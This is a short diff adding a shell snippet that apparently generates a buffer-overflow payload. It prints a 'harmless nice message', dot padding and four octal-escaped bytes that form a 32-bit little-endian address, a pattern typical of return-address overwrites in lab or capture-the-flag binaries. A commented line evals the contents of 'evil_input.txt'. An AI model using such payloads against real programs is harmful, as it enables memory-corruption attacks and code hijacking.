@@ -1,0 +1,2 @@
+# eval "$(cat evil_input.txt)" > evil_input
+printf "I am a harmless nice message! ..............\\$(printf %03o 0xa4)\\$(printf %03o 0x84)\\$(printf %03o 0x04)\\$(printf %03o 0x08)"
